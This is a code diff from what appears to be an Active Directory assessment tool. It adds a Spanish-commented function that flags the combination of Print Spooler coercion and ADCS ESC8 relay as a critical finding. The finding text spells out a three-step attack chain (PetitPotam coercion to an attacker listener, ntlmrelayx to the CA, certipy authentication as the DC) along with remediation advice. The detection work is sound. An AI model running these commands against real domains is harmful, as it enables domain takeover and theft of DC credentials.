@@ -5150,6 +5150,33 @@ export function spoolerFindings(stdout) {
 }
 
 /**
+ * Correlaciona dos señales de detección ya existentes (Print Spooler activo
+ * + plantilla ADCS vulnerable a ESC8) en una cadena de ataque completa:
+ * coerción de autenticación (PetitPotam/PrinterBug) -> relay NTLM al
+ * endpoint de web enrollment HTTP de la CA -> emisión de certificado ->
+ * autenticación como el DC coaccionado. Solo correlación de detecciones
+ * previas; no coacciona ni relaya nada. Requiere ambas señales presentes
+ * (cada una por separado ya genera su propio finding vía spoolerFindings/
+ * certipyFindFindings).
+ * https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
+ */
+export function coercionRelayEsc8Findings(spoolerStdout, certipyStdout) {
+  const spoolerActive = /Spooler service enabled|Spoolss|print spooler|Spooler is running/i.test(String(spoolerStdout || ""))
+    || (/\[\+\]/.test(String(spoolerStdout || "")) && /spooler/i.test(String(spoolerStdout || "")));
+  const esc8Present = /\bESC8\b/i.test(String(certipyStdout || ""));
+  if (!spoolerActive || !esc8Present) return [];
+  return [{
+    title: "AD: Coerción (PrinterBug/PetitPotam) + relay a ADCS ESC8 — cadena de ataque completa",
+    severity: "Critical",
+    description: "Print Spooler activo (superficie de coerción) Y una plantilla ADCS vulnerable a ESC8 (web enrollment HTTP sin protección de relay) coexisten en el mismo dominio (CWE-294): un atacante con acceso de red al segmento puede forzar al DC a autenticarse contra un listener propio y usar esa autenticación para emitir un certificado válido como el DC. Cadena para reproducir manualmente (no se ejecutó — el motor solo correlacionó dos detecciones read-only previas):\n" +
+      "  1) petitpotam.py -d <DOMAIN> '<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>   (coacciona autenticación SMB del DC hacia el listener)\n" +
+      "  2) ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController   (relay al endpoint de enrollment web de la CA)\n" +
+      "  3) certipy auth -pfx <DC>.pfx -dc-ip <DC_IP>   (usa el certificado emitido para autenticar como el DC y extraer su NT hash)",
+    remediation: "Deshabilitar Print Spooler en DCs; forzar SMB signing en toda la red; deshabilitar web enrollment HTTP de la CA o forzar Extended Protection for Authentication (EPA) + HTTPS con channel binding en /certsrv; si no es posible, restringir ESC8 exigiendo mTLS o eliminando el enrollment endpoint HTTP.",
+  }];
+}
+
+/**
  * netexec -M laps: la cuenta de assessment puede leer LAPS.
  * No se incluyen contraseñas en el hallazgo — solo hosts afectados.
  */
